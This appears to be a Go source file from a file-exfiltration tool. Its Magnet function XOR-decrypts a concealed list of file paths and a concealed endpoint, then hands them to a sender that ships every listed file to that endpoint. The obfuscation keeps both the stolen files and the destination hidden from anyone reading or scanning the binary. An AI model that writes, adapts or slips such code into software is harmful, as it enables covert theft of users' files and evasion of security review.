package magnet

import (
	"fmt"
	"strings"

	encryption "github.com/ariary/go-utils/pkg/encrypt"
)

// Magnet: wrapper functions to decrypt file list and endpoint and send all the files to the endpoint
func Magnet(sender MagnetSender, fileList string, endpoint string, key string, debug bool) {
	//unflat file list + decrypt files
	files := UnfreezeList(fileList, key, debug)

	// decrypt endpoint
	cEndpoint := UnfreezeEndpoint(endpoint, key, debug)

	// send files
	sender.SendFiles(files, cEndpoint, debug)
}

// Magnet: wrapper functions to decrypt file list and endpoint and send all the files to the endpoint using HTTP
// func Magnet(fileList string, endpoint string, key string, debug bool) {
// 	//unflat file list + decrypt files
// 	files := UnfreezeList(fileList, key, debug)

// 	// decrypt endpoint
// 	cEndpoint := UnfreezeEndpoint(endpoint, key, debug)

// 	// send files
// 	SendFiles(files, cEndpoint, debug)
// }

// UnfreezeList: unflat a file list and decrypt them using xor function. if debug mode is enabled, print some information
func UnfreezeList(files string, key string, debug bool) (fileList []string) {
	encFileList := strings.Split(files, "\n")
	fileList = make([]string, len(encFileList))
	if debug {
		fmt.Println("files:")
	}
	for i := 0; i < len(encFileList); i++ {
		filename, err := encryption.Decode(encFileList[i])
		if err != nil && debug {
			fmt.Println(err)
		}
		fileList[i] = encryption.Xor(string(filename), key)
		if debug {
			fmt.Println(fileList[i])
		}
	}
	return fileList
}

// UnfreezeEndpoint: Decrypt endpoint with xor function
func UnfreezeEndpoint(endpoint string, key string, debug bool) (cEndpoint string) {
	decEndpoint, err := encryption.Decode(endpoint)
	if err != nil && debug {
		fmt.Println(err)
	}
	cEndpoint = encryption.Xor(string(decEndpoint), key)
	if debug {
		fmt.Println("endpoint:", cEndpoint)
	}
	return cEndpoint
}
